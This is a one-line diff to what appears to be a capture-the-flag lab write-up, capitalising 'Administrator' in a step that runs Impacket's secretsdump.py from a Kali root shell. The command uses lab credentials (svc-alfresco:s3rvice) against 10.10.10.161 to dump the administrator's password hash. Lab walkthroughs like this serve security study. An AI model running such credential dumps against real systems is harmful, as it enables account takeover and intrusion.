@@ -457,7 +457,7 @@ Please choose a path [0-1] 1
 root@kali:~#
 ```
 
-After that, we can use `secretdump.py` in `Impacket` to dump the password hash for `administrator`.<br>
+After that, we can use `secretdump.py` in `Impacket` to dump the password hash for `Administrator`.<br>
 ```shell
 root@kali:~# /usr/local/bin/secretsdump.py svc-alfresco:s3rvice@10.10.10.161
 Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation
